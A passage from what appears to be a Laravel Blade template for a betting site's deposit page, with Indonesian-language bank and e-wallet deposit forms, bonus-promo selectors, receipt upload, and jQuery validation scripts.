                                                                                                    Nama Akun bank </small>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <input id="info-copy-1"
                                                                                                    value="{{ $linkaja->nama_penerima }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-1"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" ">WARKOP GAUL
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    No. Wallet / ACCT
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2"
                                                                                                style="padding-bottom: 10px;">
                                                                                                <input id="info-copy-2"
                                                                                                    value="8205506752"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-2"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span
                                                                                                        style="white-space: normal; word-break: break-word;">SCAN BARCODE QR
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small>Min Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"
                                                                                                    id="min_modal_gopay">
                                                                                                    IDR50,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 ">
                                                                                                <small i18n="">Max
                                                                                                    Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right ">
                                                                                                <span class="lbl">
                                                                                                    IDR1,000,000,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Komisi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">

                                                                                                <span class="lbl">
                                                                                                    IDR 0.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Subsidi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR 0
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4">
                                                                            <div class="font-weight-bold">
                                                                                Bonus </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="m-15" style="width: 100%;">
                                                                                <div style="width: 100%;">
                                                                                    <select class="form-control promoList"
                                                                                         id="pilih_promo_gopay"
                                                                                        name="bonus_id">
                                                                                        <option disabled selected
                                                                                            value="0">Pilih promo
                                                                                            tersedia</option>
                                                                                        @foreach ($bonus as $b)
                                                                                            <option
                                                                                                value="{{ $b->id }}"
                                                                                               
                                                                                                data-persentase="{{ $b->nominal }}">
                                                                                                {{ $b->keterangan }}
                                                                                                <!--  data-min="@currency($b->minimal)"
                                                                                                data-minin="{{ $b->minimal }}"
                                                                                                    Minimal Transaksi:
                                                                                                @currency($b->minimal) -->
                                                                                            </option>
                                                                                        @endforeach
                                                                                    </select>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Jumlah Deposit<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8">
                                                                            <div class=" d-flex flex-wrap">
                                                                                <input type="text" id="min_in_gopay"
                                                                                    class="form-control m-15 price-tag"
                                                                                    placeholder="Masukan Nominal Deposit"
                                                                                    name="nominal" min="50000"
                                                                                    required>
                                                                            </div>
                                                                            <p class="min-max-notes">
                                                                                Min Claim Bonus<span
                                                                                    class="min-deposit-amount"
                                                                                    style="padding-right: 5px;"><b
                                                                                        id="min_gopay">
                                                                                        100,000.00</b></span><br>
                                                                                Max Claim Bonus<span
                                                                                    class="max-deposit-amount"><b>
                                                                                        10,000,000.00</b></span>
                                                                            </p>
                                                                             <div class=" d-flex flex-wrap">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Keterangan </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <input type="text" required
                                                                                class="form-control m-15" id="ref_no"
                                                                                maxlength="35" minlength="5"
                                                                                name="keterangan"
                                                                                placeholder="No. Referensi / Nama Pengirim">
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Bukti Transfer </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="file-drop-area m-15">
                                                                                <span class="btn btn-secondary "
                                                                                    i18n="">Pilih File</span>
                                                                                <span class="file-msg">
                                                                                    Bukti Transfer
                                                                                </span>
                                                                                <input class="file-input"
                                                                                    name="bukti_transfer" 
                                                                                    id="receipt" type="file"
                                                                                    accept="image/png, image/jpg, image/jpeg">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-12 d-flex flex-wrap">
                                                                            <label>
                                                                                <input type="checkbox"
                                                                                    class="form-check-input"
                                                                                    id="exampleCheck1"
                                                                                    name="termcondition">
                                                                                Saya telah membaca dan menyetujui Syarat dan Selalu pastikan rekening pengirim atau rekening tujuan sesuai dengan data yang terdaftar pada menu Form Deposit Situs.

                                        Kami tidak memberikan toleransi apabila terjadi kesalahan pengiriman uang (Deposit) ke rekening yang bukan rekening SITUS kami.

                                        Transfer wajib memakai kode unik 888, Contoh 100.888.
                                                                                Harap melakukan konfirmasi deposit 1x saja, dan tunggu permohonan anda diproses untuk dapat melakukan deposit selanjutnya.
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!--- second Tab end----->
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="m-15">
                                                                            <button type="button"
                                                                                class="btn btn-primary" id="backBtn"
                                                                                onclick="tutup_bank()">Back</button>

                                                                            <button type="submit"
                                                                                class="btn btn-secondary"
                                                                                id="submitBtn">Deposit</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <script>
                                        function btn_bca() {
                                            document.getElementById('modal_bca').style.display = "block";
                                            document.getElementById('metode').style.display = "none";
                                        }
                                        $('#pilih_promo_bca').on('change', function() {
                                            const selected = $(this).find('option:selected');
                                            const min = selected.data('min');
                                            const minin = selected.data('minin');
                                            const persentase = selected.data('persentase');
                                            console.log(min)
                                            $("#bonus_persentase_bca").val(persentase);
                                            $("#min_bca").html(min);
                                            $("#min_modal_bca").html(min);
                                            $("#min_in_bca").prop('min', minin);;
                                        });

                                        function btn_bni() {
                                            document.getElementById('modal_bni').style.display = "block";
                                            document.getElementById('metode').style.display = "none";
                                        }
                                        $('#pilih_promo_bni').on('change', function() {
                                            const selected = $(this).find('option:selected');
                                            const min = selected.data('min');
                                            const minin = selected.data('minin');
                                            const persentase = selected.data('persentase');
                                            console.log(min)
                                            $("#bonus_persentase_bni").val(persentase);
                                            $("#min_bni").html(min);
                                            $("#min_modal_bni").html(min);
                                            $("#min_in_bni").prop('min', minin);;
                                        });

                                        function btn_mandiri() {
                                            document.getElementById('modal_mandiri').style.display = "block";
                                            document.getElementById('metode').style.display = "none";
                                        }
                                        $('#pilih_promo_mandiri').on('change', function() {
                                            const selected = $(this).find('option:selected');
                                            const min = selected.data('min');
                                            const minin = selected.data('minin');
                                            const persentase = selected.data('persentase');
                                            console.log(min)
                                            $("#bonus_persentase_mandiri").val(persentase);
                                            $("#min_mandiri").html(min);
                                            $("#min_modal_mandiri").html(min);
                                            $("#min_in_mandiri").prop('min', minin);;
                                        });

                                        function btn_bri() {
                                            document.getElementById('modal_bri').style.display = "block";
                                            document.getElementById('metode').style.display = "none";
                                        }
                                        $('#pilih_promo_bri').on('change', function() {
                                            const selected = $(this).find('option:selected');
                                            const min = selected.data('min');
                                            const minin = selected.data('minin');
                                            const persentase = selected.data('persentase');
                                            console.log(min)
                                            $("#bonus_persentase_bri").val(persentase);
                                            $("#min_bri").html(min);
                                            $("#min_modal_bri").html(min);
                                            $("#min_in_bri").prop('min', minin);;
                                        });

                                        function btn_dana() {
                                            document.getElementById('modal_dana').style.display = "block";
                                            document.getElementById('metode').style.display = "none";
                                        }
                                        $('#pilih_promo_dana').on('change', function() {
                                            const selected = $(this).find('option:selected');
                                            const min = selected.data('min');
                                            const minin = selected.data('minin');
                                            const persentase = selected.data('persentase');
                                            console.log(min)
                                            $("#bonus_persentase_dana").val(persentase);
                                            $("#min_dana").html(min);
                                            $("#min_modal_dana").html(min);
                                            $("#min_in_dana").prop('min', minin);;
                                        });

                                        function btn_linkaja() {
                                            document.getElementById('modal_linkaja').style.display = "block";
                                            document.getElementById('metode').style.display = "none";
                                        }
                                        $('#pilih_promo_linkaja').on('change', function() {
                                            const selected = $(this).find('option:selected');
                                            const min = selected.data('min');
                                            const minin = selected.data('minin');
                                            const persentase = selected.data('persentase');
                                            console.log(min)
                                            $("#bonus_persentase_linkaja").val(persentase);
                                            $("#min_linkaja").html(min);
                                            $("#min_modal_linkaja").html(min);
                                            $("#min_in_linkaja").prop('min', minin);;
                                        });

                                        function btn_ovo() {
                                            document.getElementById('modal_ovo').style.display = "block";
                                            document.getElementById('metode').style.display = "none";
                                        }
                                        $('#pilih_promo_ovo').on('change', function() {
                                            const selected = $(this).find('option:selected');
                                            const min = selected.data('min');
                                            const minin = selected.data('minin');
                                            const persentase = selected.data('persentase');
                                            console.log(min)
                                            $("#bonus_persentase_ovo").val(persentase);
                                            $("#min_ovo").html(min);
                                            $("#min_modal_ovo").html(min);
                                            $("#min_in_ovo").prop('min', minin);;
                                        });

                                        function btn_gopay() {
                                            document.getElementById('modal_gopay').style.display = "block";
                                            document.getElementById('metode').style.display = "none";
                                        }
                                        $('#pilih_promo_gopay').on('change', function() {
                                            const selected = $(this).find('option:selected');
                                            const min = selected.data('min');
                                            const minin = selected.data('minin');
                                            const persentase = selected.data('persentase');
                                            console.log(min)
                                            $("#bonus_persentase_gopay").val(persentase);
                                            $("#min_gopay").html(min);
                                            $("#min_modal_gopay").html(min);
                                            $("#min_in_gopay").prop('min', minin);;
                                        });

                                        function tutup_bank() {
                                            document.getElementById('metode').style.display = "block";
                                            document.getElementById('modal_bca').style.display = "none";
                                            document.getElementById('modal_bni').style.display = "none";
                                            document.getElementById('modal_mandiri').style.display = "none";
                                            document.getElementById('modal_bri').style.display = "none";
                                            document.getElementById('modal_dana').style.display = "none";
                                            document.getElementById('modal_linkaja').style.display = "none";
                                            document.getElementById('modal_ovo').style.display = "none";
                                            document.getElementById('modal_gopay').style.display = "none";

                                        }

                                        // function load_form($type, $method = 0, $provider = 0, $pID = "") {
                                        //     showLoadingImgFn();
                                        //     $.get('https://www.geo138.life/account/load_deposit_form?isgateway=' + $type + '&method=' + $method +
                                        //         '&provider=' + $provider + '&pID=' + $pID,
                                        //         function(d) {
                                        //             $('.content-form').html(d);
                                        //             removeLoadingImgFn();
                                        //         }).fail(
                                        //         function(xhr, status, error) {
                                        //             removeLoadingImgFn();
                                        //             sweetAlert(xhr.responseJSON ? xhr.responseJSON.message : xhr.responseText);
                                        //         }
                                        //     );
                                        // }

                                        // $(document).ready(function() {

                                        //     let def = 'BankTransfer';
                                        //     let preload = $('#preload').val();
                                        //     $('.deposit .tab-pane[data-toggle="' + def + '"]').toggleClass('show');
                                        //     if (preload == 0) {
                                        //         load_form(preload);
                                        //     }



                                        // });
                                    </script>

                                </div>
                                <div class="col-xs-12 col-md-4  fs-sm content-txt">
                                    <div>
                                        <div class="d-none d-md-block fs-sm" i18n>
                                            {{ $setting->nama_web }} are favourite for our speedy crediting of funds to your account
                                            and experience. Thus, please use Bank Transfer via your local bank account. We
                                            do not accept
                                            all
                                            kinds of deposit by "Cheque" or "Bank Draft" (Company OR Personal Cheque) as
                                            your deposit
                                            method.
                                            <br /> <br />
                                            Note: Once you have successfully submitted your deposit form and once your funds
                                            is cleared
                                            in
                                            our account, just leave it to our team to process your transactions as speedy as
                                            possible.
                                            If
                                            more than 10 minutes, let us know by clicking
                                            <a class="btn btn-link" href="#" target="_blank">here</a> and
                                            our
                                            Customer Service support will assist you 24/7 anytime.
                                            <br /> <br />
                                        </div>
                                        <!-- <span i18n>lang.Please make sure that you fill up accurate bank account details to avoid any inconveniences.</span> -->
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                    <div class="modal-wrapper nifty-modal slide-in-bottom add_bank_modal" id="regbank_popup__depo">
                    </div>

                    <div class='md-overlay'></div>
                    <div class="col-xs-12">
                        <div class="acc_safety_info box-wrapper deposit-notice-wraper">
                            <div class="deposit-notice-content">
                                <h4 class="notice__title text-uppercase">PEMBERITAHUAN PENTING</h4>
                                <ol>
                                    <li><span style="font-weight: bolder;">Sebelum melakukan deposit harap periksa
                                            terlebih
                                            dahulu
                                            no.rekening tujuan deposit.</span></li>
                                    <li><span style="font-weight: bolder;">Dilarang menulis catatan apapun di setiap
                                            transaksi.</span></li>
                                    <!-- <li><span style="font-weight: bolder;">Tidak di anjurkan Via Mesin EDC, jika terlanjur
                                            transfer,
                                            akan di Proses 1x24jam.</span></li> -->
                                    <li><span style="font-weight: bolder;">Harap menggunakan rekening terdaftar untuk
                                            deposit dan
                                            penarikan.</span></li>
                                    <li><span style="font-weight: bolder;">Apabila nama pengirim tidak sesuai dengan nama
                                            yang
                                            terdaftar, maka deposit tidak akan kami proses.</span></li>
                                    <li><span style="font-weight: bolder;">Untuk Deposit via Bank / E-wallet harus
                                            menggunakan Kode Unik 888, Contoh 100.888.
                                            Selalu pastikan tujuan rekening deposit, sesuai dengan data yang terdaftar pada menu form deposit situs.</span></li>
                                </ol>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>

        <script>
            $(document).ready(function() {

                $(function() {
                    var path = window.location.pathname || '';
                    path = path.replace(new RegExp('/', 'g'), '').toLowerCase();
                    $('.mdc-tab[data-active="' + path + '"]').addClass('mdc-tab--active');
                    $('.mdc-tab[data-active="' + path + '"] .mdc-tab-indicator').addClass(
                        'mdc-tab-indicator--active');
                });

            });
        </script>
    </div>
    <script>
        window.removeOptions = function($select, $options) {
            window.setOriginalSelect($select);
            $options.remove();
        }

        window.restoreOptions = function($select) {
            var ogHTML = $select.data("originalHTML");
            if (ogHTML != undefined) {
                $select.html(ogHTML);
            }
        }
        window.setBankUserOptions = function(method) {

            var $s = $('select#bank_user_id');
            window.restoreOptions($s); // Make sure you're working with a full deck
            var $optsToRemove = $s.find('option').not('[data-method=' + method + ']').not('[value=""]');
            if (method == 5) {
                $optsToRemove = $optsToRemove.not('[data-method=' + 7 + ']');
            }
            window.removeOptions($s, $optsToRemove); // remove options not needed

        }

        //    var promoMin = '50000,50000';
        //     if (promoMin.includes(",")) {
        //         promoMin = promoMin.split(",");
        //     } else {
        //         promoMin = [promoMin];
        //     }
        //     var promoMax = '500000,100000';
        //     if (promoMax.includes(",")) {
        //         promoMax = promoMax.split(",");
        //     } else {
        //         promoMax = [promoMax];
        //     }

        var secret_key = 'aa';
        var bank_min_amount = _min_amount = "50000";
        var bank_max_amount = _max_amount = "9999999999";
        var min_string = "The minimum deposit amount is";
        var max_string = "The maximum deposit amount is";
        var method = 5;
        var providerSettingID = "62e38ed31eaaed54a07d6433";
        var pID = "62e38b32760c914ab90f14fd";
        var agent_code = 'UABAAAD';

        $(document).ready(function() {
            window.setBankUserOptions(method);
            $('#bankInfo_de001').show();
            // $('#bankInfo_de001').hide();
            $('#promoInfo_de001').hide();


            var onFirstLoad = true;

            function onChgDepositeMethod() {
                $('.deposit-form').hide();
                $('#deposit-form-' + $(this).val()).show();
                $('select.bank_list').prop('disabled', true);
                $('select.bank_list').val('');
                $('#bank_name_' + $(this).val()).prop('disabled', false);
                $('#bank_user_id').prop('disabled', false);

                if (method == 6) {
                    $('#ref_no').attr('placeholder', 'No Ref /No Serial /No Pengirim');
                } else {
                    $('#ref_no').attr('placeholder', 'No. Referensi / Nama Pengirim');
                }
                $('#bankList').html('');
                $('#bankInfo_de001').show();
                // $('#bankInfo_de001').hide();

            }

            $('input[name=deposite_method]').change(onChgDepositeMethod);

            $('input[name=deposite_method][value="' + method + '"]').each(onChgDepositeMethod);



            // $('#deposite_amount').on('keyup',function(e){
            //     $(this).val(formatNumberInput(e.target,''));

            // });

            // $('#deposite_amount').on('blur',function(e){
            //     $(this).val(formatNumberInput(e.target,'blur'));

            // });

            $('.bank_list').on('change', function() {

                //var status = $(this).find("option:selected").data('status');
                var select_name = $(this).val();
                var position = $(this).find(":selected").index();
                $('#bankList').html('');
                $('#bankInfo_de001').hide();
                var type = $(this).data('type');
                var provider_Id = $(this).find(":selected").data('p_id');
                $('input[id=bank_to_provider]').val(provider_Id);

                bank_max_amount = _max_amount;
                bank_min_amount = _min_amount;
                $('.min_deposit').val(_min_amount);
                $('.max_deposit').val(_max_amount);
                var _self = this;

                function onSelBankIsNotEmpty() {
                    $('#bankInfo_de001').fadeIn();
                    var _bank_min = $('#bank_min_deposit').val();
                    var _bank_max = $('#bank_max_deposit').val();
                    bank_min_amount = parseInt(_bank_min);
                    bank_max_amount = parseInt(_bank_max);
                    $('.min-deposit-amount').html('<b>' + window.commaSeparateNumber(bank_min_amount) +
                        '</b>');
                    $('.max-deposit-amount').html('<b>' + window.commaSeparateNumber(bank_max_amount) +
                        '</b>');
                    var o = {
                        msg: ''
                    };
                    var cal_min_amount = getMinDepoWithPromo(bank_min_amount, o);
                    var msgMin = o.msg;

                    adddepositAmtRules(cal_min_amount, bank_max_amount, msgMin);
                }

                function onSelBankIsEmpty() {
                    var o = {
                        msg: ''
                    };
                    var cal_min_amount = getMinDepoWithPromo(bank_min_amount, o);
                    var msgMin = o.msg;
                    adddepositAmtRules(cal_min_amount, bank_max_amount, msgMin);
                }

                function getBankDetails() {
                    var token = $("input[name='_token']").val();
                    var _onFirstLoad = onFirstLoad;

                    var __self = _self;
                    $.ajax({
                        url: "#",
                        type: "POST",
                        data: {
                            select_name: select_name,
                            _token: token,
                            type: type,
                            lang: window.lang,
                            provider_id: provider_Id
                        },
                        beforeSend: function() {
                            $("#bankList").html();
                            2000
                        },
                        success: function(data) {
                            if (data) {


                                $("#bankList").html(data);

                                if ($('#depo_acc_status').val() == 'OFFLINE') {
                                    if (!_onFirstLoad) {
                                        sweetAlert(transMsgs.offlineBank, 'warning', 'Warning',
                                            true).then(
                                            function(isConfirm) {
                                                if (isConfirm) {

                                                    onSelBankIsNotEmpty();
                                                } else {
                                                    $("#bankList").html('');
                                                    $(__self).val(null);
                                                    onSelBankIsEmpty();
                                                }
                                            }
                                        );

                                        return;
                                    }

                                }

                                onSelBankIsNotEmpty();
                                return;


                            } else {
                                $("#bankList").html('');
                                $(_self).val(null);
                                onSelBankIsEmpty();
                            }
                        }
                    });
                }

                if (!!select_name) {
                    // getBankDetails();
                } else {
                    onSelBankIsEmpty();

                }



                return false;

            });

            // Add new banks for user form pokerace ------------------------------------------------------------------


            $('#btn_add_ubank__depo').click(function(e) {

                // $(this).prop('disabled',  true);
                $('#regbank_popup__depo').html('');
                $('#regbank_popup__depo').load('/regaccform?type=' + method, function() {
                    $('#regbank_popup__depo').nifty("show");
                    if (method == 5) {
                        window.bindBankRegFormVal('#bank_register_popup');
                    } else {
                        window.bindNewFundRegFormVal("#pulsa_register_form");
                    }

                });
            });
            // document.getElementById("bank_user_id").onchange = function () {

            //     status = this.options[this.selectedIndex].getAttribute("status");
            //     switch(status ){
            //         case "2" :
            //             $(this).val("");
            //           return sweetAlert( "This account is currently suspend");
            //         break;
            //         case "0" :
            //             $(this).val("");
            //             return sweetAlert( "This account  is currently inactive");
            //         break;
            //      }

            // }

            // end of add bank section ---------------------------------------------------------------------------------------------

            function getMinDepoWithPromo(bank_min, msgMin) {
                msgMin.msg = min_string;
                bank_min = bank_min ? bank_min : _min_amount;
                var selPromoInd = $('.promoList').find(":selected").index();
                var hasSelPromo = !!selPromoInd || !!$('#promo_code').val();
                if (!hasSelPromo) {
                    return bank_min;
                } else {

                    promo_min_amount = parseInt($('#promo_min_amount').val()); //

                    if (!!promo_min_amount) {

                        if (promo_min_amount > bank_min) {
                            msgMin.msg = "Persyaratan minimal deposit untuk promo adalah ";

                            return promo_min_amount;
                        }
                    }

                }

                return bank_min;
            }
            // $('select[data-plugin="bank_list"][data-type="'+ method + '"]').prop('disabled',false).val(providerSettingID).trigger('change');
            $('select[data-plugin="bank_list"][data-type="' + method + '"]').find('option').each(function(index,
                element) {
                let provider_id = $(element).data('p_id');
                let provider_setting_id = element.value;
                if (provider_id == pID && provider_setting_id == providerSettingID) {
                    $(element).prop('selected', 'selected').trigger('change');
                }

            });
            onFirstLoad = false;
            $('.promoList').on('change', function() {
                //var selected = $(this).find("option:selected").val();
                var promo_id = $(this).val();

                // var position = $(this).find(":selected").index();
                $('#promoList').html('');
                $('#promoInfo_de001').hide();

                if (promo_id == 0) {
                    $('input[name="promo_code"]').prop('disabled', false);
                    var msgMin = min_string;
                    adddepositAmtRules(bank_min_amount, bank_max_amount, msgMin);
                    $('input[name="pcode_not_confirm"]').prop('disabled', false);
                    $('#btn_apply_pcode').prop('disabled', false);
                } else {
                    $('input[name="promo_code"]').val('');
                    $('input[name="promo_code"]').prop('disabled', true);

                    function cbPromoList(r) {
                        if (r.status) {
                            $('input[name="pcode_not_confirm"]').val('').prop('disabled', true);
                            $('#btn_apply_pcode').prop('disabled', true);
                        }
                    }
                    // getPromoNAddDepoRules(promo_id, cbPromoList);
                    return false;

                }
                return false;
            });

            function adddepositAmtRules(intMin, intMax, msgMin) {
                $("#deposite_amount").rules("remove", "min max");
                $("#deposite_amount").rules("add", {
                    min: intMin,
                    max: intMax,

                    messages: {
                        min: msgMin + window.currencyCode + window.commaSeparateNumber(intMin),
                        max: "Jumlah deposit maksimum adalah" + window.currencyCode + window
                            .commaSeparateNumber(intMax),
                    }
                });
            }

            function getPromoNAddDepoRules(promo_id, cb, reqUrl = "#",
                is_promo_code = false) {
                $('#promoInfo_de001').hide();
                $("#promoList").html('');
                var result = {
                    status: true,
                    msg: ''
                };
                var token = $("input[name='_token']").val();

                //clear promo code first
                $('input[name="promo_code"]').prop('disabled', true).val('');
                $.ajax({
                    url: reqUrl,
                    type: "POST",
                    async: true,
                    data: {
                        select_name: promo_id,
                        _token: token,
                        is_promo_code: is_promo_code
                    },
                    //dataType: 'json',
                    beforeSend: function() {
                        $("#bankList").html();
                        2000
                    },
                    success: function(data) {
                        if (data) {

                            $("#promoList").html(data);
                            $('#promoInfo_de001').fadeIn();


                            depoValidator.showErrors({
                                "promo_code": null
                            });
                        }
                    },
                    error: function(xhr, status, error) {
                        result.status = false;


                        if (xhr.responseJSON) {
                            result.msg = xhr.responseJSON.message;

                        } else {

                            result.msg = JSON.parse(xhr.responseText).message;
                        }
                        sweetAlert(result.msg, 'warning', 'Warning');
                        $('#promo_event').val(0);

                    },
                    complete: function() {


                        cb(result);

                        var o = {
                            msg: ''
                        };
                        var cal_min_amount = getMinDepoWithPromo(bank_min_amount, o);
                        var msgMin = o.msg;
                        adddepositAmtRules(cal_min_amount, bank_max_amount, msgMin);

                    },
                });

                return result;
            }

            $('#btn_add_promo').click(function() {
                $('#f_grp_promo_code').fadeIn();
                var v = $('#promo_event').val();
                if (!!v && v != 0) {
                    $('#pcode_not_confirm').prop('disabled', true);
                } else {
                    $('#pcode_not_confirm').prop('disabled', false);
                }
                $(this).parent().hide();
                return false;
            });
            var btn_click = false;
            $('#btn_apply_pcode').click(function(e) {
                if (btn_click == true) {
                    return;
                }
                btn_click = true;
                e.preventDefault();
                $(this).prop('disabled', true);

                function cbPromoCode(r) {
                    if (r.status) {

                        $('#promo_event').val(0).prop('disabled', true);
                        $('input[name="promo_code"]').prop('disabled', false).val($(
                            'input[name="pcode_not_confirm"]').val());
                        $('input[name="pcode_not_confirm"]').prop('disabled',
                            true); //when pcode correct , user shud click clear btn
                        $('#btn_apply_pcode').hide();
                        $('#btn_clear_pcode').show();
                        depoValidator.showErrors({
                            "promo_code": null
                        });
                    } else {
                        depoValidator.showErrors({
                            "promo_code": r.msg
                        });
                    }

                    setTimeout(function() {
                        $('#btn_apply_pcode').prop('disabled', false).blur().focusout();
                        btn_click = false;
                    }, 2000);
                }

                var v = $('#pcode_not_confirm').val();
                var r = {
                    'status': true,
                    'msg': ''
                };
                if (!v || (v && v.length < 2)) {
                    r.status = false;
                    r.msg = "Kode promo tidak boleh lebih dari 8 karakter";
                } else if (!v || (v && v.length > 15)) {
                    r.status = false;
                    r.msg = "Kode promo tidak boleh lebih dari 15 karakter";
                } else {
                    // r = getPromoNAddDepoRules(v, cbPromoCode, "#",
                    //     true);
                    return false;
                }

                cbPromoCode(r);

                return false;
            });


            $(document).on('click', '#btn_clear_pcode, #btn-clear-all-promo', function() {
                $('input[name="promo_code"]').prop('disabled', false).val('');
                $('input[name="pcode_not_confirm"]').prop('disabled', false).val('');
                $('#promo_event').prop('disabled', false).val(0);
                $('#btn_apply_pcode').prop('disabled', false);
                $('#btn_clear_pcode').hide();
                $('#btn_apply_pcode').show();
                $("#promoList").html('');
                $('#promoInfo_de001').hide();
                var msgMin = min_string;
                adddepositAmtRules(bank_min_amount, bank_max_amount, msgMin);
                return false;
            });

            var droppedFiles = false;
            $('.file-drop-area').on('drag dragstart dragend dragover dragenter dragleave drop', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                })
                .on('dragover dragenter', function() {
                    $(this).addClass('is-dragover');
                })
                .on('dragleave dragend drop', function() {
                    $(this).removeClass('is-dragover');
                })
                .on('drop', function(e) {
                    droppedFiles = e.originalEvent.dataTransfer.files;
                    $(this).find('input[type="file"]').prop('files', droppedFiles);

                    if (droppedFiles) {
                        $(this).find('.file-msg').html(droppedFiles[0].name);
                    } else {

                        $(this).find('.file-msg').html('   or drag and drop file here');
                    }
                });

            $('.file-drop-area input[type="file"]').on('change', function(e) {
                var file = e.target.files;
                if (file) {
                    var fileName = file[0] ? file[0].name : '   or drag and drop file here';

                    $('.file-drop-area .file-msg').html(fileName);
                } else {
                    $('.file-drop-area .file-msg').html('   or drag and drop file here');
                }
            })




            $('#btn_clear_pcode').click(function() {
                $('#promoList').html('');
            });


            const rules = {
                // The key name on the left side is the name attribute
                // of an input field. Validation rules are defined
                // on the right side
                // deposite_amount: {
                //     required: true,
                //     normalizer: function(value) {
                //         return value ? convertToNumber(value) : null;
                //     },
                //     number: true,
                //     min: bank_min_amount,
                //     max: bank_max_amount,

                // },
                nominal: {
                    required: true,
                    normalizer: function(value) {
                        // return '500000';
                        // console.log(convertToNumber(value));
                        return convertToNumber(value);
                    },
                    number: true,
                    min: 50000,
                    max: bank_max_amount,

                },
                bank_name: {
                    required: true
                },
                bank_user_id: {
                    required: true,
                },
                deposite_method: {
                    required: true
                },
                // promo_event: {
                //     required:true
                // },
                promo_code: {
                    minlength: 2,
                    maxlength: 15,
                    // validatePromoCode:true
                },
                termcondition: {
                    required: true
                },
                receipt: {
                    extension: 'jpeg|jpg|png|bmp',
                },
                ref_no: {
                    pattern: /^[a-zA-Z0-9, .\/\\\-]+$/,
                    maxlength: 35,
                    minlength: 5,
                }
            };

            const messages = {
                deposite_amount: {
                    required: " tidak boleh kosong",
                    number: "Jumlahnya harus berupa angka",
                    min: "Jumlah deposit minimum adalah " + window.currencyCode + window
                        .commaSeparateNumber(bank_min_amount),
                    max: "Jumlah deposit maksimum adalah " + window.currencyCode + window
                        .commaSeparateNumber(bank_max_amount),
                },
                nominal: {
                    required: " tidak boleh kosong",
                    number: "Jumlahnya harus berupa angka",
                    min: "Jumlah deposit minimum adalah " + window.currencyCode + window
                        .commaSeparateNumber(bank_min_amount),
                    max: "Jumlah deposit maksimum adalah " + window.currencyCode + window
                        .commaSeparateNumber(bank_max_amount),
                },
                bank_name: {
                    required: " tidak boleh kosong",
                },
                bank_user_id: {
                    required: " tidak boleh kosong",
                    remote: "Please Select Valid Bank"
                    //remote : transMsgs.bankAccountNamesNotAvailable,
                },
                deposite_method: {
                    required: " tidak boleh kosong",
                },
                promo_event: {
                    required: "Metode Promosi diperlukan. Silakan pilih Metode Promosi.",
                },
                termcondition: {
                    required: "Syarat dan ketentuan diperlukan",
                },
                receipt: {
                    extension: "File yang dipilih tidak valid",
                },
                ref_no: {
